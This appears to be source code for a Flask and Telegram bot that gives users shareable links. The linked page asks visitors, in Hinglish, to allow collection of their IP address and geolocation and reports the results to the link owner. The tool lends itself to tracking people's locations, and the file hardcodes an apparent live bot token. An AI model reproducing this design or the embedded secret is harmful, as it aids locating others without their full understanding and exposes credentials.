import os
import sqlite3
import random
import string
import requests
import json
import asyncio
from flask import Flask, request, render_template_string, jsonify
from flask_cors import CORS
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ============ CONFIGURATION ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8606346167:AAFekHPvXf7OzYdQYq_d6YvT83CQHu7yelc")
BASE_URL = os.environ.get("BASE_URL", "https://login018.onrender.com")

# ============ DATABASE SETUP ============
conn = sqlite3.connect('database.db', check_same_thread=False)
c = conn.cursor()

c.execute('''CREATE TABLE IF NOT EXISTS users (
    telegram_id TEXT PRIMARY KEY,
    username TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')

c.execute('''CREATE TABLE IF NOT EXISTS links (
    link_id TEXT PRIMARY KEY,
    owner_id TEXT,
    clicks INTEGER DEFAULT 0,
    allows INTEGER DEFAULT 0,
    blocks INTEGER DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')

c.execute('''CREATE TABLE IF NOT EXISTS collected_data (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    link_id TEXT,
    ip TEXT,
    latitude TEXT,
    longitude TEXT,
    city TEXT,
    country TEXT,
    collected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')
conn.commit()

# ============ HELPERS ============
def generate_link_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def save_user(telegram_id, username):
    c.execute("INSERT OR IGNORE INTO users (telegram_id, username) VALUES (?, ?)", (telegram_id, username))
    conn.commit()

def create_link(owner_id):
    link_id = generate_link_id()
    c.execute("INSERT INTO links (link_id, owner_id) VALUES (?, ?)", (link_id, owner_id))
    conn.commit()
    return f"{BASE_URL}/collect/{link_id}"

# ============ HTML TEMPLATE ============
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Permission Required</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        h1 { color: #333; margin-bottom: 10px; }
        .icon { font-size: 64px; margin-bottom: 20px; }
        p { color: #666; margin-bottom: 30px; line-height: 1.6; }
        .btn-allow {
            background: #10b981;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            margin: 10px;
            transition: all 0.3s;
        }
        .btn-block {
            background: #ef4444;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            margin: 10px;
            transition: all 0.3s;
        }
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        .info {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
        .loading {
            display: none;
            margin-top: 15px;
            color: #667eea;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">📍🌐</div>
        <h1>Permission Required</h1>
        <p>Yeh page aapka <strong>IP address</strong> aur <strong>location</strong> access karna chahta hai.<br>
        Yeh data sirf aapki <strong>Allow</strong> karne par hi collect hoga.</p>
        
        <button class="btn-allow" onclick="allowPermission()">✅ Allow</button>
        <button class="btn-block" onclick="blockPermission()">❌ Block</button>
        
        <div class="loading" id="loading">⏳ Processing...</div>
        
        <div class="info">
            ⚠️ Agar Allow karte ho toh IP + location owner tak pahuchegi<br>
            🔒 Block karne par kuch nahi hoga
        </div>
    </div>

    <script>
        const linkId = "{{ LINK_ID }}";
        
        async function getIP() {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        }
        
        function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject("Geolocation not supported");
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({lat: pos.coords.latitude, lon: pos.coords.longitude}),
                    err => reject(err.message)
                );
            });
        }
        
        async function allowPermission() {
            document.getElementById('loading').style.display = 'block';
            
            try {
                const ip = await getIP();
                let locationData = {lat: null, lon: null};
                
                try {
                    const loc = await getLocation();
                    locationData = loc;
                } catch(e) {
                    console.log("Location not shared:", e);
                }
                
                const response = await fetch('/collect-data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        link_id: linkId,
                        ip: ip,
                        latitude: locationData.lat,
                        longitude: locationData.lon
                    })
                });
                
                const result = await response.json();
                alert("✅ " + result.message);
                window.location.href = "https://www.google.com";
            } catch(error) {
                alert("Error: " + error.message);
            }
        }
        
        function blockPermission() {
            fetch('/block', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({link_id: linkId})
            });
            alert("❌ Aapne block kar diya. Koi data collect nahi hua.");
            window.location.href = "https://www.google.com";
        }
    </script>
</body>
</html>
'''

# ============ FLASK SERVER ============
app = Flask(__name__)
CORS(app)

def get_ip_location(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        if data['status'] == 'success':
            return data['city'], data['country'], data['lat'], data['lon']
    except:
        pass
    return "Unknown", "Unknown", None, None

@app.route('/collect/<link_id>')
def collect_page(link_id):
    c.execute("UPDATE links SET clicks = clicks + 1 WHERE link_id = ?", (link_id,))
    conn.commit()
    return render_template_string(HTML_TEMPLATE, LINK_ID=link_id)

@app.route('/collect-data', methods=['POST'])
def collect_data():
    data = request.json
    link_id = data.get('link_id')
    ip = data.get('ip')
    lat = data.get('latitude')
    lon = data.get('longitude')
    
    city, country, lat_from_ip, lon_from_ip = get_ip_location(ip)
    
    final_lat = lat if lat else lat_from_ip
    final_lon = lon if lon else lon_from_ip
    
    c.execute("INSERT INTO collected_data (link_id, ip, latitude, longitude, city, country) VALUES (?, ?, ?, ?, ?, ?)",
              (link_id, ip, final_lat, final_lon, city, country))
    c.execute("UPDATE links SET allows = allows + 1 WHERE link_id = ?", (link_id,))
    conn.commit()
    
    return jsonify({"status": "success", "message": f"Data saved! IP: {ip}"})

@app.route('/block', methods=['POST'])
def block():
    data = request.json
    link_id = data.get('link_id')
    c.execute("UPDATE links SET blocks = blocks + 1 WHERE link_id = ?", (link_id,))
    conn.commit()
    return jsonify({"status": "blocked"})

@app.route('/')
@app.route('/home')
def home():
    return "Bot is running! 🤖"

@app.route('/health')
def health():
    return "OK", 200

# ============ TELEGRAM BOT WITH WEBHOOK ============
# Create global application instance
app_bot = None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    save_user(str(user.id), user.username)
    
    await update.message.reply_text(
        f"👋 **Hello {user.first_name}!**\n\n"
        "Main aapko apna **custom link** banane dunga.\n"
        "Jab aapke dost us link par tap karenge, toh unse **permission** maangi jayegi IP aur location ke liye.\n\n"
        "✅ Sirf Allow karne walo ka data collect hoga\n"
        "❌ Block karne walo ka kuch nahi hoga\n\n"
        "🔗 **Apna link banane ke liye:** /newlink\n"
        "📊 **Stats dekhne ke liye:** /stats",
        parse_mode="Markdown"
    )

async def new_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    link = create_link(user_id)
    
    await update.message.reply_text(
        f"✅ **Aapka link ready hai!**\n\n"
        f"🔗 `{link}`\n\n"
        f"Ye link apne dosto ko bhejo.\n"
        f"Jab woh tap karenge, toh unhe pop-up dikhega — Allow ya Block.\n\n"
        f"📊 Stats dekhne ke liye: /stats",
        parse_mode="Markdown"
    )

async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    c.execute("SELECT link_id, clicks, allows, blocks FROM links WHERE owner_id = ?", (user_id,))
    links = c.fetchall()
    
    if not links:
        await update.message.reply_text("❌ Aapne abhi koi link nahi banaya. /newlink use karein.")
        return
    
    message = "📊 **Aapke links ke stats:**\n\n"
    for link_id, clicks, allows, blocks in links:
        message += f"🔗 `{BASE_URL}/collect/{link_id}`\n"
        message += f"   👆 Total Clicks: {clicks}\n"
        message += f"   ✅ Allows: {allows}\n"
        message += f"   ❌ Blocks: {blocks}\n\n"
    
    await update.message.reply_text(message, parse_mode="Markdown")

# Webhook endpoint
@app.route(f'/webhook', methods=['POST'])
async def webhook():
    global app_bot
    if app_bot is None:
        return "Bot not initialized", 500
    
    try:
        update = Update.de_json(request.get_json(force=True), app_bot.bot)
        await app_bot.process_update(update)
        return 'OK', 200
    except Exception as e:
        print(f"Webhook error: {e}")
        return 'Error', 500

# ============ MAIN ============
async def setup_webhook():
    global app_bot
    app_bot = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("newlink", new_link))
    app_bot.add_handler(CommandHandler("stats", show_stats))
    
    # Initialize and set webhook
    await app_bot.initialize()
    webhook_url = f"{BASE_URL}/webhook"
    await app_bot.bot.set_webhook(webhook_url)
    print(f"✅ Webhook set successfully to: {webhook_url}")
    
    # Keep application running
    await app_bot.start()
    return app_bot

if __name__ == "__main__":
    # Setup webhook in event loop
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(setup_webhook())
    
    # Get port from environment (Render provides PORT)
    port = int(os.environ.get("PORT", 5000))
    
    print(f"🚀 Bot is running with webhook on port {port}")
    print(f"📡 Webhook URL: {BASE_URL}/webhook")
    
    # Run Flask server
    app.run(host='0.0.0.0', port=port)